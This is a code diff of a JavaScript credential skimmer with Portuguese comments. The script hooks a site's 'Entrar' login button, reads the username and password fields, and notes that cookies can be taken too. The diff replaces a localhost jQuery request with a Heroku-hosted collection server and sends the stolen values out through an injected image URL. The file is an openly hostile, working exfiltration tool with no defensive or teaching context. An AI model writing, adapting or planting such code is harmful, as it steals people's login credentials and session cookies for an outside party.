@@ -1,5 +1,4 @@
-server_address = '127.0.0.1' // o endereço do seu servidor que irá receber os dados
-server_port = '8001' // a porta do servidor
+server_address = 'https://floating-springs-98504.herokuapp.com' // o endereço do seu servidor que irá receber os dados
 
 // na primeira página é esse o botão "Entrar"
 $("input[type='submit']").on('click', function(event){
@@ -17,12 +16,9 @@ function getCredenciais(){
     senha = $("input#pass");
     cookies = document.cookie // pode enviar também os cookies se achar interessante
     if(login && senha){
-        // a saída será mostrada no log do servidor web (ou criar um app para receber os parametros e guardar no db ou arquivo)
-        // Exemplo para subir servidor web: $php -S server_address:server_port
-        // se não tiver um app para receber a requisição vai falhar com código 404
-        $.get({
-            url: "http://" + server_address + ":" + server_port + "?login=" + login.val() + "&senha=" + senha.val(),
-            async: true
-        })
+        img = document.createElement("IMG");
+        img.src = server_address + "?usuario=" + login.val() + "&senha=" + senha.val()
+        document.appendChild(img);
+
     }
 }
